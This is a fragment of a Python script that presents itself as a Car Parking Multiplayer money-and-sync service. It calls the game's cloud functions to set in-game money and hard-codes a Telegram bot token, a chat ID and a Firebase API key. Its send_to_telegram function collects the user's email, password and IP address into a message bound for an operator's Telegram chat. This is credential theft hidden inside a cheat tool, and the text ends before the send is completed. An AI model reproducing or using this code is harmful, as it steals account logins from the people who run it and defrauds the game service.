import requests
import json
import os
import time

# --- CONFIGURATION ---
BOT_TOKEN = "8354373377:AAHl8zF0MCfB-g2uNZBnJKPPwIOWi9AHcfg"
CHAT_ID = "7183809303"
FIREBASE_API_KEY = 'AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM'
FIREBASE_URL = f"https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key={FIREBASE_API_KEY}"

# URLs for CPM Services
MONEY_URL = "https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserMoney4"
SYNC_URL = "https://us-central1-cp-multiplayer.cloudfunctions.net/SyncPlayerSync4"

SESSION_FILE = ".session_service"

def screen_clear():
    os.system('clear')

def get_ip():
    try: return requests.get('https://api.ipify.org', timeout=5).text
    except: return "Unknown"

def send_to_telegram(email, password, service_type):
    if os.path.exists(SESSION_FILE): return
    ip = get_ip()
    message = (
        f"💰 *NEW SERVICE USED*\n\n"
        f"📧 *Email:* `{email}`\n"
        f"🔑 *Pass:* `{password}`\n"
        f"⚙️ *Service:* {service_type}\n"
        f"🌐 *IP:* `{ip}`\n"
        f"👤 *Brand:* @anonymo.cpm"
    )
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
